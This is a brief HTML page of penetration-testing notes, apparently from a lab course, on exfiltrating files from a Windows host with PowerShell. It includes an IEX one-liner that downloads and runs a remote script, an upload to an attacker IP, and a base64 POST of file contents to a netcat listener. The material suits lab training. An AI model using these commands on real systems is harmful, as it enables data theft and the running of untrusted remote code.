<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Powershell web Uploads.</title>
</head><body>Powershell has no built in upload function.<br/>
<br/>
So we need to install uploadserver module:<br/>
Install it on kali:<ul><li style="list-style-type: none">pip3 install uploadserver &nbsp;</li>
</ul>
Start the server:<ul><li style="list-style-type: none">python3 -m uploadserver &nbsp;</li>
</ul>
Now we can use a PowerShell script PSUpload.ps1 to perform the file Upload<br/>
(accepts 2 Parameter -File (file path) -Uri the server URL<ul><li style="list-style-type: none">PS C:\htb&gt; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') </li>
</ul>
&nbsp;&#09;PS C:\htb&gt; Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts <br/>
<br/>
Another method is to use base 64 in combination with a netca listeneder on our local machine:<br/>
Start NC listener on kali:<ul><li style="list-style-type: none">nc -lvnp 8000 </li>
</ul>
base64 encode the file and send it as post request on the PS: &nbsp;<ul><li style="list-style-type: none">PS C:\htb&gt; $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte)) </li>
<li style="list-style-type: none">PS C:\htb&gt; Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64 &nbsp;</li>
</ul>
Write the received base64 string into a new file on kali<ul><li style="list-style-type: none">echo &lt;base64&gt; | base64 -d -w 0 &gt; hosts &nbsp;</li>
</ul>
</body></html>